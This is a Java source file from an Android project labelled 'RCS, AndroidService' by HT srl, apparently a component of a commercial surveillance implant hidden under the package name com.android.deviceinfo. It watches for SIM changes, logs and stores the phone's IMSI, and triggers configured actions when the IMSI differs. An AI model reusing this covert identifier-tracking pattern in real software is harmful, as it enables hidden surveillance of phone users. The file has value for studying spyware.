/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.event;

import java.io.IOException;

import com.android.deviceinfo.Device;
import com.android.deviceinfo.Sim;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfEvent;
import com.android.deviceinfo.evidence.Markup;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.ListenerSim;
import com.android.deviceinfo.util.Check;

public class EventSim extends BaseEvent implements Observer<Sim> {
	/** The Constant TAG. */
	private static final String TAG = "EventSim"; //$NON-NLS-1$

	private int actionOnEnter;

	@Override
	public void actualStart() {
		ListenerSim.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerSim.self().detach(this);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		return true;
	}

	@Override
	public void actualGo() {
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sim s) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got SIM status notification: " + s.getImsi());//$NON-NLS-1$
		}

		// Verifichiamo la presenza della SIM
		if (s.getImsi().length() == 0) {
			return 0;
		}

		Markup storedImsi = new Markup(this);

		// Vediamo se gia' c'e' un markup
		if (storedImsi.isMarkup() == true) {
			try {
				final byte[] actual = storedImsi.readMarkup();
				final String storedValue = new String(actual);

				if (storedValue.contentEquals(s.getImsi()) == false) {
					// Aggiorniamo il markup
					final byte[] value = s.getImsi().getBytes();
					storedImsi.writeMarkup(value);

					onEnter();
					onExit();
				}
			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
		} else {
			final String imsi = Device.self().getImsi();

			final byte[] value = imsi.getBytes();

			storedImsi.writeMarkup(value);
		}

		storedImsi = null;
		return 0;
	}

}